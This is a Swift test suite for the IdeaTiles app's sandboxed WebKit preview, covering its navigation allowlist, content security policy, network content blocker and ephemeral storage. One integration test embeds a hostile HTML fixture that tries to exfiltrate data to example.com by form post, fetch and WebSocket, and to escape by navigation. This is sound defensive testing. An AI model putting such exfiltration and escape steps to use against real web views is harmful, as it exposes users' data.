import Foundation
import Testing
import WebKit
@testable import IdeaTiles

@Suite("Ephemeral static preview policy")
struct PreviewSecurityTests {
    @Test("allows only package-local navigation")
    func navigationAllowlist() throws {
        let policy = PreviewSecurityPolicy(sessionID: "preview1")

        #expect(policy.allows(URL(string: "ideatiles-preview://preview1/index.html")!))
        #expect(!policy.allows(URL(string: "ideatiles-preview://other/index.html")!))
        #expect(!policy.allows(URL(string: "https://example.com")!))
        #expect(!policy.allows(URL(filePath: "/tmp/escape")))
    }

    @Test("CSP allows local scripts and styles while blocking network and forms")
    func restrictiveCSP() {
        let csp = PreviewSecurityPolicy.contentSecurityPolicy

        #expect(csp.contains("default-src 'self'"))
        #expect(csp.contains("script-src 'self' 'unsafe-inline'"))
        #expect(csp.contains("style-src 'self' 'unsafe-inline'"))
        #expect(csp.contains("connect-src 'none'"))
        #expect(csp.contains("form-action 'none'"))
        #expect(csp.contains("frame-src 'none'"))
    }

    @Test("content blocker denies every network transport")
    func blocksNetworkTransports() throws {
        let rules = try #require(try JSONSerialization.jsonObject(with: Data(PreviewSecurityPolicy.contentBlockerRules.utf8)) as? [[String: Any]])
        let triggers = rules.compactMap { $0["trigger"] as? [String: Any] }
        let filters = triggers.compactMap { $0["url-filter"] as? String }

        #expect(filters.contains { $0.contains("https?") })
        #expect(filters.contains { $0.contains("wss?") })
    }

    @Test("preview configuration is ephemeral and exposes no native scripts")
    @MainActor
    func ephemeralConfiguration() {
        let configuration = StaticPreviewHost.makeConfiguration()

        #expect(!configuration.websiteDataStore.isPersistent)
        #expect(configuration.userContentController.userScripts.isEmpty)
    }

    @Test("real preview blocks hostile network, forms, navigation, native handlers, and storage persistence")
    @MainActor
    func hostilePreviewIntegration() async throws {
        let root = try TestDirectory.make()
        let html = #"""
        <!doctype html><html><head></head><body>
        <form id="hostileForm" action="https://example.com/exfiltrate" method="post"><button>Send</button></form>
        <a id="hostileLink" href="https://example.com/escape">Escape</a>
        <script>
          window.previewResults = {
            previousStorage: localStorage.getItem('preview-secret'),
            nativeHandlerAbsent: !window.webkit?.messageHandlers?.ideaTilesBridge,
            fetchBlocked: false,
            socketBlocked: false
          };
          localStorage.setItem('preview-secret', 'must-not-persist');
          fetch('https://example.com/leak').then(
            () => window.previewResults.fetchBlocked = false,
            () => window.previewResults.fetchBlocked = true
          );
          try {
            const socket = new WebSocket('wss://example.com/socket');
            socket.onopen = () => window.previewResults.socketBlocked = false;
            socket.onerror = () => window.previewResults.socketBlocked = true;
          } catch (_) { window.previewResults.socketBlocked = true; }
          document.getElementById('hostileForm').requestSubmit();
          document.getElementById('hostileLink').click();
        </script>
        </body></html>
        """#
        try Data(html.utf8).write(to: root.appending(path: "index.html"))

        let first = try await StaticPreviewHost(root: root, sessionID: "hostile")
        try await expectEventually(first.webView, script: "window.previewResults?.fetchBlocked === true && window.previewResults?.socketBlocked === true")
        #expect(try await first.webView.evaluateJavaScript("window.previewResults.nativeHandlerAbsent") as? Bool == true)
        #expect(first.webView.url?.absoluteString == "ideatiles-preview://hostile/index.html")

        let second = try await StaticPreviewHost(root: root, sessionID: "hostile")
        try await expectEventually(second.webView, script: "window.previewResults != null")
        #expect(try await second.webView.evaluateJavaScript("window.previewResults.previousStorage === null") as? Bool == true)
    }

    @Test("real private scheme loads bundled CSS and modules and mounts React")
    @MainActor
    func bundledAppIntegration() async throws {
        let resourceRoot = try #require(Bundle.main.url(forResource: "WebApp", withExtension: nil))
        let configuration = WKWebViewConfiguration()
        let handler = BundleSchemeHandler(root: resourceRoot)
        configuration.setURLSchemeHandler(handler, forURLScheme: "ideatiles")
        let webView = WKWebView(frame: .zero, configuration: configuration)
        webView.load(URLRequest(url: try #require(URL(string: "ideatiles://app/index.html"))))

        try await expectEventually(
            webView,
            script: "document.readyState === 'complete' && document.styleSheets.length > 0 && document.querySelector('#root')?.children.length > 0"
        )
        #expect(try await webView.evaluateJavaScript("document.querySelectorAll('script[type=module]').length > 0") as? Bool == true)
        #expect(try await webView.evaluateJavaScript("getComputedStyle(document.body).position === 'fixed' && getComputedStyle(document.body).overflow === 'hidden'") as? Bool == true)
    }
}

@MainActor
private func expectEventually(
    _ webView: WKWebView,
    script: String,
    timeout: Duration = .seconds(5)
) async throws {
    let clock = ContinuousClock()
    let deadline = clock.now.advanced(by: timeout)
    while clock.now < deadline {
        if (try? await webView.evaluateJavaScript(script) as? Bool) == true { return }
        try await Task.sleep(for: .milliseconds(25))
    }
    Issue.record("WKWebView condition did not become true: \(script)")
}
